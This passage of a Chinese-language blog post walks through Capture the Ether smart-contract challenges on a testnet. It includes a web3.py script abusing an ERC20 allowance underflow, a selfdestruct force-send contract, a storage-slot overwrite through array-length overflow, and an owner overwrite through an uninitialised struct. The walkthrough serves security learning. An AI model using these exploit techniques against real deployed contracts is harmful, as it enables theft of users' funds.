class="line"><span class="string">				&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;transferFrom&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;decimals&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint8&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;balanceOf&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;symbol&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;string&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;,</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;transfer&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;,</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;allowance&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;_player&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;anonymous&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;from&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;,</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;,</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;indexed&quot;: false,</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;Transfer&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;event&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;anonymous&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;owner&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;,</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;spender&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;,</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;indexed&quot;: false,</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;Approval&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;event&quot;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    function transferFrom(address from, address to, uint256 value) public &#123;</span></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[api_key]&quot;</span>))</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line"></span><br><span class="line">MasterAccount = w3.eth.account.from_key(MasterPrivKey)</span><br><span class="line">HelpAccount   = w3.eth.account.from_key(HelpPrivKey)</span><br><span class="line"><span class="comment"># setp1</span></span><br><span class="line">log.info(<span class="string">&quot;Step1 , Transfer to HELP Account: 800 value &quot;</span>)</span><br><span class="line"><span class="comment">#    function transfer(address to, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.transfer(HelpAccount.address, <span class="number">800</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(MasterAccount.address),</span><br><span class="line">       <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed =  MasterAccount.signTransaction(tx)</span><br><span class="line">tx_id  =  w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step1 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 </span></span><br><span class="line">log.info(<span class="string">&quot;Step2 , Call approve&quot;</span>)</span><br><span class="line"><span class="comment">#    unction approve(address spender, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.approve(MasterAccount.address, <span class="number">1000</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(HelpAccount.address),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed = HelpAccount.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step2 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 transferFrom(address)</span></span><br><span class="line">log.info(<span class="string">&quot;Step3 , call transferFrom to solve challenge&quot;</span>)</span><br><span class="line"><span class="comment">#    function transferFrom(address from, address to, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.transferFrom(HelpAccount.address,HelpAccount.address, <span class="number">500</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(MasterAccount.address),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed =  MasterAccount.signTransaction(tx)</span><br><span class="line">tx_id  =  w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step3 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">print(contract.functions.isComplete().call())</span><br><span class="line">log.success(<span class="string">&quot;Solved !&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-Retirement-fund"><a href="#3-Retirement-fund" class="headerlink" title="3. Retirement fund"></a>3. Retirement fund</h3><p><strong>题目描述：</strong></p>
<p>This retirement fund is what economists call a <a href="https://en.wikipedia.org/wiki/Commitment_device">commitment device</a>. I’m trying to make sure I hold on to 1 ether for retirement.</p>
<p>I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I <em>do</em> withdraw early, 10% of my ether goes to the <code>beneficiary</code> (you!).</p>
<p>I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract RetirementFundChallenge &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner &#x3D; msg.sender;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration &#x3D; now + 10 years;</span><br><span class="line"></span><br><span class="line">    function RetirementFundChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        beneficiary &#x3D; player;</span><br><span class="line">        startBalance &#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        if (now &lt; expiration) &#123;</span><br><span class="line">            &#x2F;&#x2F; early withdrawal incurs a 10% penalty</span><br><span class="line">            msg.sender.transfer(address(this).balance * 9 &#x2F; 10);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            msg.sender.transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectPenalty() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; beneficiary);</span><br><span class="line"></span><br><span class="line">        uint256 withdrawn &#x3D; startBalance - address(this).balance;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; an early withdrawal occurred</span><br><span class="line">        require(withdrawn &gt; 0);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; penalty is what&#39;s left</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=Mx0xCI1jaUM">Smooth Criminal</a>.</p>
<p><strong>解题：</strong></p>
<p>题目设置了一个十年后才能取出 eth 的合约， 要求我们提前取出所有的 Balance 。重点在  <code>collectPenalty</code> 函数上。</p>
<p>如果我们能使得 <code>withdrawn &gt; 0</code>  成立， 则可以取出所有的恶 balance , 我们会注意到   <code>startBalance - address(this).balance</code>  存在溢出， 但是条件得是 <code>startBalance</code>  小于 <code>address(this).balance</code> 。 </p>
<p>这里涉及到一个知识点：</p>
<p> <code>SELFDESTRUCT</code> 函数可以强制发送 ETH：</p>
<p><code>SELFDESTRUCT</code>  是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的balance发送给参数所指定的地址，比较特殊的是这笔ether的发送将无视合约的fallback函数，所以它是强制性的 。</p>
<p>攻击合约代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract ForceAttack &#123;</span><br><span class="line"></span><br><span class="line">function ForceAttack(address target) public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0);</span><br><span class="line">        selfdestruct(target);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-56e0b6532a1b9189dca92827361b4251-6a4de7.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-56e0b6532a1b9189dca92827361b4251-6a4de7.png"></a></p>
<p>最后调用 <code>collectPenalty</code>  函数即可。</p>
<h3 id="4-Mapping"><a href="#4-Mapping" class="headerlink" title="4. Mapping"></a>4. Mapping</h3><p><strong>题目描述:</strong></p>
<p>MATH: 750 POINTS</p>
<p><a href="https://capturetheether.com/challenges/math/mapping/#">Begin Challenge</a></p>
<p>Who needs <code>mapping</code>s? I’ve created a contract that can store key/value pairs using just an array.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        &#x2F;&#x2F; Expand dynamic array as needed</span><br><span class="line">        if (map.length &lt;&#x3D; key) &#123;</span><br><span class="line">            map.length &#x3D; key + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] &#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=A259WnFMRXI">Map To My Heart</a>.</p>
<p><strong>解题：</strong></p>
<p>题目设置了 一个 map ， 我们可以对 map 进行操作， 要求将 <code>isComplete</code> 设置为 True 即可。 感觉就是溢出 map 的空间，覆盖到 <code>isComplete</code>  的位置即可。</p>
<p>通过了解，我们可以知道动态数组，其在声明中所在位置决定的存储位里存放的是其长度，而其中的变量的存储位则是基于其长度所在的存储进行，这部分的详细内容可以参见此处一篇翻译文章<a href="https://segmentfault.com/a/1190000013791133">了解以太坊智能合约存储</a></p>
<p>solidity的storage slot存储</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">slot 0: isComplete</span><br><span class="line">slot 1: map.length</span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line">slot keccak(1): map[0]</span><br><span class="line">slot keccak(1) + 1: map[1]</span><br><span class="line">slot keccak(1) + 2: map[2]</span><br><span class="line">slot keccak(1) + 3: map[3]</span><br><span class="line">slot keccak(1) + 4: map[4]</span><br><span class="line">&#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure>

<p>动态数组内变量所在的存储位的计算公式即为</p>
<blockquote>
<p>keccak256(slot) + index</p>
</blockquote>
<p>map.length = key + 1;<br>当map.length溢出会回绕到slot 0 即可完成isComplete的覆盖</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a &#x3D; binascii.unhexlify(&#39;%064x&#39; % 1)</span><br><span class="line">&gt;&gt;&gt; Web3.keccak(a)</span><br><span class="line">HexBytes(&#39;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6&#39;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 2**256 - int(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)</span><br><span class="line">35707666377435648211887908874984608119992236509074197713628505308453184860938</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>则在 <code>35707666377435648211887908874984608119992236509074197713628505308453184860938</code>  位置设置为 1 即可。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-d1dcf575fc9218b0e5e3c8830d9072f1-2cf778.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-d1dcf575fc9218b0e5e3c8830d9072f1-2cf778.png"></a></p>
<h3 id="5-Donation"><a href="#5-Donation" class="headerlink" title="5. Donation"></a>5. Donation</h3><p><strong>题目描述：</strong></p>
<p>A candidate you don’t like is accepting campaign contributions via the smart contract below.</p>
<p>To complete this challenge, steal the candidate’s ether.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function DonationChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        </span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        &#x2F;&#x2F; amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale &#x3D; 10**18 * 1 ether;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; etherAmount &#x2F; scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp &#x3D; now;</span><br><span class="line">        donation.etherAmount &#x3D; etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=_AUXpnB065o">Space Force</a>.</p>
<p><strong>解题：</strong></p>
<p>这也是一个变量覆盖题目。  Struct在函数内非显式地初始化的时候会使用storage存储而不是memory。具体讲就是 <code>donate()</code> 中 <code>donation</code> 定义时未指定引用，默认指向 slot0 。 因此我们可覆盖solt 0和slot 1处1存储的状态变量，恰好solt 1存储的即为owner</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Donation donation;</span><br><span class="line">donation.timestamp &#x3D; now;</span><br><span class="line">donation.etherAmount &#x3D; etherAmount;</span><br><span class="line"></span><br><span class="line">now覆盖slot(0) etherAmount覆盖slot(1) 利用etherAmount覆盖owner</span><br></pre></td></tr></table></figure>


<p>我们需要将 owner 覆盖为我们的账户， 然后将 balance 取出。</p>
<p>攻击： 设置 value 满足要求，即  <code>address // 10**36</code> , 设置 etherAmount 的值为我的地址</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-6f26b26a462d04d333633fe40ca5cc26-aaa1a0.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-6f26b26a462d04d333633fe40ca5cc26-aaa1a0.png"></a></p>
<p>攻击后：</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-4b66ff4cca9faf1eecd042aeeb118525-f7a3f0.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-4b66ff4cca9faf1eecd042aeeb118525-f7a3f0.png"></a></p>
<p>这样我就可以将 balance 全部取出了。</p>
<h3 id="6-Fifty-years"><a href="#6-Fifty-years" class="headerlink" title="6. Fifty years"></a>6. Fifty years</h3><p><strong>题目描述：</strong></p>
<p>This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later.</p>
<p>All you have to do to complete this challenge is wait 50 years and withdraw the ether. If you’re not that patient, you’ll need to combine several techniques to hack this contract.</p>
